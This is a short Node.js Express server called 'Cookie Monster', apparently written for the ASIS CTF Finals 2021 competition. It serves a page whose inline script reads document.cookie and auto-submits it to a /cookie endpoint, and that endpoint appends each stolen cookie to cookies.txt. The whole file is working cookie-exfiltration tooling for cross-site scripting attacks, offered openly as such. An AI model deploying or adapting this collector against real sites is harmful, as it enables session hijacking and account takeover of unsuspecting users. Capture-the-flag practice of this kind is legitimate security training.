'use strict';

//modules
var fs = require('fs');

// setup express
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cors = require('cors');
const port = process.env.PORT || 3000;

// packages for express
app.use( bodyParser.json() );       // to support JSON-encoded bodies
app.use(bodyParser.urlencoded({     // to support URL-encoded bodies
 extended: true})); 
app.use(cors());

var cookieFunc = function(cookie){
    fs.appendFile('cookies.txt', cookie, function (err){
        if(err) throw err;
        console.log("Saved cookie " + cookie + " to file.");
    });
}

app.get('/', (req, res)=>{
    res.send(`<html>
    <h1>Cookie Monster</h1>
    <h4>Joshua Famous</h4>
    <p>This website grabs cookies and sends them to a flat file. For ASIS CTF Finals 2021.</p>
    <form action="http://localhost:` + port + `/cookie" method="POST" id="cookieForm">
        <input type="text" name="cookie" placeholder="xyz" id="cookieInput">
    </form>

    <script>
        document.getElementById("cookieInput").value = document.cookie;
        document.getElementById("cookieForm").submit();
    </script>
    </html>`);
});

app.post('/cookie', (req, res)=>{
    cookieFunc(req.body.cookie);
    res.send('<h1>Posted!</h1>');
});

app.listen(port, ()=>{
    console.log("Running on " + port);
})